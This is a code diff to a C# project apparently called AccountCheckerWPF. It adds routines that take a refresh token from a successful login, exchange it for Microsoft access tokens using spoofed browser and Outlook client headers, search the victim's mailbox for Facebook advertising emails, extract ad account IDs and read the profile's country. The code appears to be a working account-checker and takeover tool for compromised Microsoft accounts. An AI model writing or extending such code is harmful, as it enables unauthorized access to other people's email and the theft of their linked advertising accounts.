@@ -2,9 +2,11 @@ using System.Net;
 using System.Net.Http;
 using System.Net.Http.Headers;
 using System.Text;
+using AccountCheckerWPF.Helper;
 using AccountCheckerWPF.Managers;
 using AccountCheckerWPF.Models;
 using AccountCheckerWPF.Services.Interface;
+using Newtonsoft.Json.Linq;
 
 namespace AccountCheckerWPF.Services;
 
@@ -136,6 +138,194 @@ public class HttpServices : IHttpServices
         {
             _proxy.InUse = false;
             throw;
+        }
+    }
+
+    public async Task HandleLoginSuccessResponse(HttpResponseMessage postResponse, List<string> cookies)
+    {
+        var cid = CommonHelper.GetCookieValue("MSPCID", cookies)?.ToUpper();
+
+        var address = postResponse.RequestMessage.RequestUri.ToString();
+        var refreshToken = CommonHelper.ExtractValueBetween(address, "refresh_token=", "&");
+
+        if (refreshToken != null)
+        {
+            var getAccessTokenResponse = await SendPostRequestToGetAccessTokenAsync(refreshToken);
+            var getAccessTokenResponseBody = await getAccessTokenResponse.Content.ReadAsStringAsync();
+            var json = JObject.Parse(getAccessTokenResponseBody);
+            var accessToken = json["access_token"];
+
+            await ProcessEmailData(accessToken.ToString(), cid);
+            var jwtToken = await GetJwtTokenAsync(refreshToken, cid);
+            var userProfileJson = await GetUserProfileInfoAsync(jwtToken, cid);
+            var countryCode = ParseCountryCode(userProfileJson);
+        }
+    }
+
+    public async Task ProcessEmailData(string accessToken, string cid)
+    {
+        var url =
+            "https://outlook.office.com/api/beta/me/MailFolders/AllItems/messages?$select=Sender,Subject,From,CcRecipients,HasAttachments,Id,SentDateTime,ToRecipients,BccRecipients&$top=1000&$search=\"from:advertise-noreply@support.facebook.com\"";
+
+        // Set up headers
+        _httpClient.DefaultRequestHeaders.Add("User-Agent", "Outlook-Android/2.0");
+        _httpClient.DefaultRequestHeaders.Add("Pragma", "no-cache");
+        _httpClient.DefaultRequestHeaders.Add("Accept", "application/json");
+        _httpClient.DefaultRequestHeaders.Add("ForceSync", "false");
+        _httpClient.DefaultRequestHeaders.Authorization =
+            new AuthenticationHeaderValue("Bearer", accessToken);
+        _httpClient.DefaultRequestHeaders.Add("X-AnchorMailbox", $"CID:{cid}");
+        _httpClient.DefaultRequestHeaders.Host = "substrate.office.com";
+        _httpClient.DefaultRequestHeaders.ConnectionClose = false;
+
+        try
+        {
+            var response = await _httpClient.GetAsync(url);
+            response.EnsureSuccessStatusCode();
+            var responseBody = await response.Content.ReadAsStringAsync();
+
+            var jsonResponse = JObject.Parse(responseBody);
+
+            var subjects = jsonResponse["value"]
+                .Select(mail => mail["Subject"].ToString())
+                .ToList();
+
+            foreach (var subject in subjects)
+            {
+                var adsTitle = System.Web.HttpUtility.HtmlDecode(subject);
+                int adsCount = CountOccurrences(adsTitle, "(");
+
+                Console.WriteLine($"Found {adsCount} ads in subject: {adsTitle}");
+
+                var idMatches = System.Text.RegularExpressions.Regex.Matches(adsTitle, @"\(([^)]*)\)")
+                    .Select(m => m.Groups[1].Value)
+                    .Distinct()
+                    .ToList();
+
+                foreach (var id in idMatches)
+                {
+                    Console.WriteLine($"Extracted ID: {id}");
+                }
+            }
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine($"Error while fetching or processing email data: {ex.Message}");
+        }
+    }
+
+    private int CountOccurrences(string source, string word)
+    {
+        return (source.Length - source.Replace(word, "").Length) / word.Length;
+    }
+
+    private async Task<string> GetJwtTokenAsync(string refreshToken, string cid)
+    {
+        var url = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token";
+
+
+        // Set up headers
+        _httpClient.DefaultRequestHeaders.Add("Accept", "*/*");
+        _httpClient.DefaultRequestHeaders.Add("Accept-Encoding", "gzip, deflate, br");
+        _httpClient.DefaultRequestHeaders.Add("Accept-Language", "vi");
+        _httpClient.DefaultRequestHeaders.Add("Connection", "keep-alive");
+        _httpClient.DefaultRequestHeaders.Add("Origin", "https://account.microsoft.com");
+        _httpClient.DefaultRequestHeaders.Add("Referer", "https://account.microsoft.com/");
+        _httpClient.DefaultRequestHeaders.Add("Sec-Fetch-Dest", "empty");
+        _httpClient.DefaultRequestHeaders.Add("Sec-Fetch-Mode", "cors");
+        _httpClient.DefaultRequestHeaders.Add("Sec-Fetch-Site", "cross-site");
+        _httpClient.DefaultRequestHeaders.Add("User-Agent",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 OPR/102.0.0.0");
+        _httpClient.DefaultRequestHeaders.Add("sec-ch-ua",
+            "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Opera GX\";v=\"102\"");
+        _httpClient.DefaultRequestHeaders.Add("sec-ch-ua-mobile", "?0");
+        _httpClient.DefaultRequestHeaders.Add("sec-ch-ua-platform", "\"Windows\"");
+
+        // Prepare the POST data
+        var postData = new List<KeyValuePair<string, string>>
+        {
+            new("client_id", "0000000048170EF2"),
+            new("scope", "https://graph.microsoft.com/.default"),
+            new("grant_type", "refresh_token"),
+            new("client_info", "1"),
+            new("x-client-SKU", "msal.js.browser"),
+            new("x-client-VER", "2.37.0"),
+            new("x-ms-lib-capability", "retry-after, h429"),
+            new("x-client-current-telemetry", "5|61,0,,,|@azure/msal-react,1.5.4"),
+            new("x-client-last-telemetry", "5|0|||0,0"),
+            new("client-request-id", "fb6d9979-05a0-4351-9da7-a1a983529796"),
+            new("refresh_token", refreshToken),
+            new("X-AnchorMailbox", cid)
+        };
+
+        var content = new FormUrlEncodedContent(postData);
+
+        try
+        {
+            // Send the POST request
+            var response = await _httpClient.PostAsync(url, content);
+            response.EnsureSuccessStatusCode();
+            var responseBody = await response.Content.ReadAsStringAsync();
+
+            // Parse the JWT from the response
+            JObject jsonResponse = JObject.Parse(responseBody);
+            var jwtToken = jsonResponse["access_token"].ToString();
+
+            return jwtToken;
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine($"Error while obtaining JWT token: {ex.Message}");
+            return null;
+        }
+    }
+
+    private async Task<string> GetUserProfileInfoAsync(string jwtToken, string cid)
+    {
+        var url = "https://graph.microsoft.com/beta/me/profile";
+
+        using (var httpClient = new HttpClient())
+        {
+            // Set up headers
+            httpClient.DefaultRequestHeaders.Add("User-Agent", "Outlook-Android/2.0");
+            httpClient.DefaultRequestHeaders.Add("Pragma", "no-cache");
+            httpClient.DefaultRequestHeaders.Add("Accept", "application/json");
+            httpClient.DefaultRequestHeaders.Add("ForceSync", "false");
+            httpClient.DefaultRequestHeaders.Authorization =
+                new AuthenticationHeaderValue("Bearer", jwtToken);
+            httpClient.DefaultRequestHeaders.Add("X-AnchorMailbox", $"CID:{cid}");
+            httpClient.DefaultRequestHeaders.Host = "substrate.office.com";
+            httpClient.DefaultRequestHeaders.ConnectionClose = false;
+
+            try
+            {
+                // Send the GET request
+                var response = await httpClient.GetAsync(url);
+                response.EnsureSuccessStatusCode();
+                var responseBody = await response.Content.ReadAsStringAsync();
+
+                return responseBody;
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Error while fetching user profile info: {ex.Message}");
+                return null;
+            }
+        }
+    }
+
+    private string ParseCountryCode(string userProfileJson)
+    {
+        try
+        {
+            var jsonResponse = JObject.Parse(userProfileJson);
+            var countryCode = jsonResponse["countryCode"]?.ToString();
+            return countryCode;
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine($"Error while parsing country code: {ex.Message}");
+            return null;
         }
     }
 }
